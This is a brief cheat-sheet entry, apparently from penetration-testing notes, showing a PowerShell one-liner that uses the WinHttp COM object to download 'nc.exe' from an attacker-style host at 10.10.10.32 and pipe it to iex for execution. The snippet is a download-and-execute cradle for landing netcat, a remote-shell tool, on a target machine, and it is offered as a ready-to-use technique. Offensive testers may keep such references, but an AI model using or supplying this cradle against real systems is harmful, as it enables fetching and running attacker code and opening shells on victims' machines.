# WinHTTPRequest Download File

OS: Windows
Description: WinHTTPSRequest File Download
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### WinHTTPRequest (PowerShell)

```jsx
$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText
```